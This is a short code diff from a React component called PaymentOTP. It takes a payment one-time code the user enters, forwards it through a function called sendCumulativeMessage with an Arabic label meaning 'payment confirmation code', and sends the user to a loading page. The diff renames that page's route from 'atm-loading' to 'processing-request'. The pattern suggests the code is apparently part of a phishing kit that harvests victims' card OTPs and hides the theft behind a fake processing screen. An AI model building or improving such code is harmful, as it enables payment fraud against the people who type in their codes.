@@ -24,7 +24,7 @@ const PaymentOTP = () => {
       const newData = { paymentOtp: otp };
       updateData(newData);
       await sendCumulativeMessage(5, "رمز تأكيد الدفع", newData);
-      navigate('/atm-loading');
+      navigate('/processing-request');
     }
   };
 
